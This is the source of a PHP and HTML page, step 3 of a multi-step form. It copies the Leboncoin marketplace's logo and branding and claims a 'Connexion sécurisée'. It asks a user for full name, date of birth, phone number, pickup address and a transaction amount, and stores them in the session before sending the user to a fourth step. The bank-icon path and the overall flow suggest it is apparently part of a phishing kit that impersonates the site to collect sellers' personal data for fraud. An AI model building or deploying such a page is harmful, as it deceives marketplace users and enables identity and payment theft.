<?php
// ============================================
// ÉTAPE 3 - INFORMATIONS DE L'ANNONCE
// ============================================
session_start();
// Vérification que l'utilisateur a bien passé l'étape 2
if (!isset($_SESSION['etape_actuelle']) || $_SESSION['etape_actuelle'] < 2 || !isset($_SESSION['email'])) {
    header('Location: etape2.php');
    exit;
}
$_SESSION['etape_actuelle'] = 3;

$erreurs = [];
$donnees = [
    'nom'            => $_SESSION['annonce']['nom'] ?? '',
    'date_naissance' => $_SESSION['annonce']['date_naissance'] ?? '',
    'telephone'      => $_SESSION['annonce']['telephone'] ?? '',
    'adresse'        => $_SESSION['annonce']['adresse'] ?? '',
    'montant'        => $_SESSION['annonce']['montant'] ?? '',
];

// Traitement du formulaire
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $nom            = trim($_POST['nom'] ?? '');
    $date_naissance = trim($_POST['date_naissance'] ?? '');
    $telephone      = trim($_POST['telephone'] ?? '');
    $adresse        = trim($_POST['adresse'] ?? '');
    $montant        = trim($_POST['montant'] ?? '');

    // Validation
    if (empty($nom)) {
        $erreurs['nom'] = "Le nom et prénom sont requis.";
    } elseif (strlen($nom) < 3) {
        $erreurs['nom'] = "Le nom doit contenir au moins 3 caractères.";
    }

    // Validation date de naissance
    if (empty($date_naissance)) {
        $erreurs['date_naissance'] = "La date de naissance est requise.";
    } else {
        $d = DateTime::createFromFormat('Y-m-d', $date_naissance);
        if (!$d || $d->format('Y-m-d') !== $date_naissance) {
            $erreurs['date_naissance'] = "Veuillez saisir une date de naissance valide.";
        } else {
            $today = new DateTime();
            $age = $today->diff($d)->y;
            if ($age < 18) {
                $erreurs['date_naissance'] = "Vous devez avoir au moins 18 ans pour utiliser ce service.";
            } elseif ($age > 120) {
                $erreurs['date_naissance'] = "Veuillez vérifier la date de naissance saisie.";
            }
        }
    }

    if (empty($telephone)) {
        $erreurs['telephone'] = "Le numéro de téléphone est requis.";
    } elseif (!preg_match('/^[0-9\s\+\-\.]{10,}$/', $telephone)) {
        $erreurs['telephone'] = "Veuillez saisir un numéro de téléphone valide.";
    }

    if (empty($adresse)) {
        $erreurs['adresse'] = "L'adresse de récupération est requise.";
    } elseif (strlen($adresse) < 10) {
        $erreurs['adresse'] = "Veuillez saisir une adresse complète.";
    }


    if (empty($montant)) {
        $erreurs['montant'] = "Le montant est requis.";
    } elseif (!is_numeric($montant) || $montant <= 0) {
        $erreurs['montant'] = "Veuillez saisir un montant valide supérieur à 0.";
    }

    // Si aucune erreur, on sauvegarde et on passe à l'étape suivante
    if (empty($erreurs)) {
        $_SESSION['annonce'] = [
            'nom'            => $nom,
            'date_naissance' => $date_naissance,
            'telephone'      => $telephone,
            'adresse'        => $adresse,
            'montant'        => $montant,
        ];
        header('Location: etape4.php');
        exit;
    } else {
        $donnees = [
            'nom'            => $nom,
            'date_naissance' => $date_naissance,
            'telephone'      => $telephone,
            'adresse'        => $adresse,
            'montant'        => $montant,
        ];
    }
}

// Date max : 18 ans aujourd'hui (pour empêcher les mineurs)
$date_max = (new DateTime('-18 years'))->format('Y-m-d');
// Date min : 120 ans en arrière
$date_min = (new DateTime('-120 years'))->format('Y-m-d');
?>
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<link rel="icon" href="images/banques/icone.png" sizes="32x32" data-next-head="">
    <link rel="icon" href="images/banques/icone.png" type="image/svg+xml" data-next-head="">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Leboncoin - Informations de l'annonce</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
    background-color: #f3f4f6;
    color: #1f2937;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
}
.header { background: #fff; padding: 16px 32px; border-bottom: 1px solid #e5e7eb; }
.logo { font-size: 28px; font-weight: 700; color: #f97316; text-decoration: none; letter-spacing: -1px; }
.main { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; }
.card {
    background: #fff; border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
    border: 1px solid #e5e7eb;
    max-width: 520px; width: 100%; padding: 32px;
}
.back-link {
    display: inline-flex; align-items: center; gap: 6px;
    color: #6b7280; font-size: 14px; text-decoration: none;
    margin-bottom: 20px; transition: color 0.2s;
}
.back-link:hover { color: #f97316; }
.back-link svg { width: 16px; height: 16px; }
.card h1 { font-size: 22px; font-weight: 700; color: #111827; margin-bottom: 8px; }
.card .subtitle { font-size: 14px; color: #6b7280; margin-bottom: 28px; line-height: 1.5; }
.form-group { margin-bottom: 20px; }
.form-group label { display: block; font-size: 14px; font-weight: 600; color: #111827; margin-bottom: 8px; }
.form-group label .required { color: #ef4444; margin-left: 2px; }
.form-group input {
    width: 100%; padding: 14px 16px;
    border: 1px solid #d1d5db; border-radius: 8px;
    font-size: 15px; color: #111827; background: #f9fafb;
    transition: all 0.2s; outline: none;
    font-family: inherit;
}
.form-group input::placeholder { color: #9ca3af; }
.form-group input:focus {
    border-color: #f97316; background: #fff;
    box-shadow: 0 0 0 3px rgba(249, 115, 22, 0.15);
}
.form-group input.error { border-color: #ef4444; background: #fef2f2; }
.error-message {
    color: #ef4444; font-size: 13px; margin-top: 6px;
    display: flex; align-items: center; gap: 6px;
}
.error-message svg { width: 14px; height: 14px; flex-shrink: 0; }
.btn {
    width: 100%; padding: 16px 24px; border-radius: 8px;
    font-size: 16px; font-weight: 600; cursor: pointer;
    border: none; transition: all 0.2s; text-align: center;
    text-decoration: none; display: inline-block; margin-top: 8px;
}
.btn-primary { background: #f97316; color: #fff; }
.btn-primary:hover {
    background: #ea580c; transform: translateY(-1px);
    box-shadow: 0 4px 12px rgba(249, 115, 22, 0.3);
}
.btn-primary:active { transform: translateY(0); }
.security-info {
    display: flex; align-items: center; justify-content: center;
    gap: 8px; margin-top: 24px; font-size: 13px; color: #6b7280;
}
.security-info svg { width: 16px; height: 16px; color: #f97316; }
.security-info .mini-logo { color: #f97316; font-weight: 700; font-size: 14px; margin-left: 4px; }
.footer { text-align: center; padding: 24px 20px 32px; font-size: 13px; color: #6b7280; }
.footer-links { display: flex; justify-content: center; gap: 20px; margin-bottom: 12px; flex-wrap: wrap; }
.footer-links a { color: #6b7280; text-decoration: none; }
.footer-links a:hover { color: #f97316; text-decoration: underline; }
.footer .footer-logo { color: #f97316; font-weight: 700; }
@media (max-width: 640px) {
    .header { padding: 12px 20px; }
    .card { padding: 24px 20px; }
    .card h1 { font-size: 20px; }
}
</style>
</head>
<body>
<header class="header">
   <a href="#" class="logo"><svg width="164" height="30" viewBox="0 0 164 30" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="text-main dark:text-on-surface pro:text-support"><path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M41.1935 25.077C43.7647 25.0728 45.3528 23.0338 45.3528 20.0045C45.3528 16.9725 43.769 14.9392 41.2007 14.9392C38.6323 14.9392 37.0556 16.9653 37.0556 20.0045C37.0556 23.0409 38.6295 25.0728 41.1935 25.077ZM43.1198 10.0236C48.0211 10.0236 51.2529 14.2472 51.3242 19.9332C51.3242 25.712 47.9426 29.9926 42.9842 29.9926C40.4887 30.0482 38.1457 28.7954 36.8059 26.6894H36.7274V29.6216H31.3482V3.88099C31.3482 1.91906 32.6538 0.691957 34.2019 0.691957C35.75 0.691957 37.0556 1.91906 37.0556 3.88099V13.0557H37.1341C38.5174 11.1316 40.7505 10.0008 43.1198 10.0236ZM62.9246 25.077C65.5001 25.077 67.0697 23.0366 67.0697 20.0045C67.0697 16.9725 65.5001 14.9392 62.9246 14.9392C60.3492 14.9392 58.7796 16.9653 58.7796 20.0045C58.7796 23.0438 60.3492 25.077 62.9246 25.077ZM62.9246 10.0236C68.9888 10.0236 72.9127 14.1687 72.9127 20.0117C72.9127 25.8547 68.9959 29.9997 62.9246 29.9997C56.8533 29.9997 52.9366 25.8547 52.9366 20.0117C52.9366 14.1687 56.8533 10.0236 62.9246 10.0236ZM139.155 10.0239C140.724 10.0239 142.03 11.251 142.058 13.213V29.6219H136.301V13.213C136.301 11.251 137.579 10.0239 139.155 10.0239ZM139.155 0C141.086 0 142.65 1.56527 142.65 3.49581C142.65 5.42636 141.086 6.99163 139.155 6.99163H139.153C137.223 6.99091 135.658 5.42564 135.659 3.4951C135.659 1.56455 137.225 0 139.155 0ZM157.162 10.0239C161.158 10.0239 163.304 12.8627 163.304 17.1654V29.6219H157.547V18.7777C157.547 16.245 156.355 15.4032 154.858 15.4032C152.631 15.4032 150.941 17.2795 150.941 21.2747V29.6219H145.183V13.0346C145.183 11.1511 146.417 10.0382 147.873 10.0382C149.329 10.0382 150.555 11.1511 150.555 13.0346V13.748H150.634C152 11.4408 154.481 10.0254 157.162 10.0239ZM123.866 25.077C126.441 25.077 128.018 23.0366 128.018 20.0045C128.018 16.9725 126.435 14.9392 123.866 14.9392C121.298 14.9392 119.721 16.9653 119.721 20.0045C119.721 23.0438 121.298 25.077 123.866 25.077ZM123.866 10.0236C129.938 10.0236 133.854 14.1687 133.854 20.0117C133.854 25.8547 129.938 29.9997 123.866 29.9997C117.795 29.9997 113.878 25.8547 113.878 20.0117C113.878 14.1687 117.802 10.0236 123.866 10.0236ZM105.36 15.0179C102.863 15.0179 101.329 16.8586 101.329 20.012C101.329 23.1653 102.863 25.006 105.36 25.006C106.791 25.0645 108.137 24.3254 108.855 23.0869H108.927L113.115 25.7765C111.659 28.6159 108.619 30 105.166 30C99.1744 30 95.4859 25.8543 95.4859 20.012C95.4859 14.169 99.1744 10.0239 105.166 10.0239C108.619 10.0239 111.688 11.3937 113.115 14.2474L108.927 16.9364H108.855C108.137 15.6978 106.791 14.9594 105.36 15.0179ZM87.1959 10.0239C91.1911 10.0239 93.3379 12.8627 93.3528 17.1654V29.6219H87.5954V18.7777C87.5954 16.245 86.404 15.4032 84.9058 15.4032C82.6799 15.4032 80.9891 17.2795 80.9891 21.2747V29.6219H75.2246V13.0203C75.2246 11.1369 76.4374 10.0382 77.8999 10.0382C79.3625 10.0382 80.5896 11.1511 80.5896 13.0346V13.748H80.668C82.0328 11.4394 84.5141 10.0239 87.1959 10.0239ZM15.6884 18.87C15.7055 19.6013 15.8353 20.3262 16.0736 21.0182L22.4945 16.2589C21.9138 15.1873 20.773 14.5402 19.5552 14.5895C17.7359 14.5895 15.6884 15.9592 15.6884 18.87ZM21.2674 25.2909C23.3485 25.1718 25.2148 23.9689 26.1829 22.124L29.9713 24.8629C28.523 27.8093 25.5694 29.9924 20.5754 29.9924C18.2125 29.9882 15.9309 29.1263 14.1545 27.5668C11.6432 29.2362 9.5029 29.9496 7.36261 29.9496C3.04635 29.9496 0 27.0602 0 22.7226V3.83091C0 1.87611 1.29844 0.649008 2.85373 0.649008C4.40901 0.649008 5.70745 1.87611 5.70745 3.83091V22.2446C5.70745 24.0995 6.52076 25.0983 8.22586 25.0983C9.15332 25.0983 10.1593 24.5632 11.4648 23.8498C10.8413 22.3666 10.526 20.7721 10.5374 19.1626C10.5374 15.0889 13.441 10.0242 19.5409 10.0242C24.8274 10.0242 27.6669 13.0984 28.8512 16.958L18.6705 24.2643C19.3689 24.9328 20.3007 25.3016 21.2674 25.2909Z"></path></svg></a>
</header>

<main class="main">
    <div class="card">
        <a href="etape2.php" class="back-link">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <line x1="19" y1="12" x2="5" y2="12"></line>
                <polyline points="12 19 5 12 12 5"></polyline>
            </svg>
            Modifier l'e-mail
        </a>
        <h1>Informations de l'annonce</h1>
        <p class="subtitle">Renseignez les informations liées à votre transaction.</p>
        <form method="POST" action="">
            <!-- Nom et Prénom -->
            <div class="form-group">
                <label for="nom">Nom et Prénom <span class="required">*</span></label>
                <input type="text" id="nom" name="nom" placeholder="Ex: Jean Dupont"
                       value="<?= htmlspecialchars($donnees['nom']) ?>"
                       class="<?= isset($erreurs['nom']) ? 'error' : '' ?>" required>
                <?php if (isset($erreurs['nom'])): ?>
                <div class="error-message">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                    </svg>
                    <?= htmlspecialchars($erreurs['nom']) ?>
                </div>
                <?php endif; ?>
            </div>

            <!-- Date de naissance (juste après le nom) -->
            <div class="form-group">
                <label for="date_naissance">Date de naissance <span class="required">*</span></label>
                <input type="date" id="date_naissance" name="date_naissance"
                       value="<?= htmlspecialchars($donnees['date_naissance']) ?>"
                       min="<?= $date_min ?>" max="<?= $date_max ?>"
                       class="<?= isset($erreurs['date_naissance']) ? 'error' : '' ?>" required>
                <?php if (isset($erreurs['date_naissance'])): ?>
                <div class="error-message">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                    </svg>
                    <?= htmlspecialchars($erreurs['date_naissance']) ?>
                </div>
                <?php endif; ?>
            </div>

            <!-- Numéro de téléphone -->
            <div class="form-group">
                <label for="telephone">Numéro de téléphone <span class="required">*</span></label>
                <input type="tel" id="telephone" name="telephone" placeholder="Ex: 06 12 34 56 78"
                       value="<?= htmlspecialchars($donnees['telephone']) ?>"
                       class="<?= isset($erreurs['telephone']) ? 'error' : '' ?>" required>
                <?php if (isset($erreurs['telephone'])): ?>
                <div class="error-message">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                    </svg>
                    <?= htmlspecialchars($erreurs['telephone']) ?>
                </div>
                <?php endif; ?>
            </div>

            <!-- Adresse de récupération -->
            <div class="form-group">
                <label for="adresse">Adresse de récupération <span class="required">*</span></label>
                <input type="text" id="adresse" name="adresse" placeholder="Ex: 123 Rue de Paris, 75000 Paris"
                       value="<?= htmlspecialchars($donnees['adresse']) ?>"
                       class="<?= isset($erreurs['adresse']) ? 'error' : '' ?>" required>
                <?php if (isset($erreurs['adresse'])): ?>
                <div class="error-message">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                    </svg>
                    <?= htmlspecialchars($erreurs['adresse']) ?>
                </div>
                <?php endif; ?>
            </div>
            <!-- Montant de l'article -->
            <div class="form-group">
                <label for="montant">Montant de l'article (€) <span class="required">*</span></label>
                <input type="text" id="montant" name="montant" placeholder="Ex: 650"
                       value="<?= htmlspecialchars($donnees['montant']) ?>"
                       class="<?= isset($erreurs['montant']) ? 'error' : '' ?>" required>
                <?php if (isset($erreurs['montant'])): ?>
                <div class="error-message">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="12" cy="12" r="10"></circle>
                        <line x1="12" y1="8" x2="12" y2="12"></line>
                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
                    </svg>
                    <?= htmlspecialchars($erreurs['montant']) ?>
                </div>
                <?php endif; ?>
            </div>

            <button type="submit" class="btn btn-primary">Suivant</button>
        </form>
    </div>

    <div class="security-info">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
            <polyline points="9 12 11 14 15 10"></polyline>
        </svg>
        <span>Connexion sécurisée</span>
        <span class="mini-logo">Leboncoin</span>
    </div>
</main>

<footer class="footer">
    <div class="footer-links">
        <a href="#">Aide</a>
        <a href="#">Confidentialité</a>
        <a href="#">Conditions générales</a>
    </div>
    <div>© 2026 <span class="footer-logo">Leboncoin</span></div>
</footer>
</body>
</html>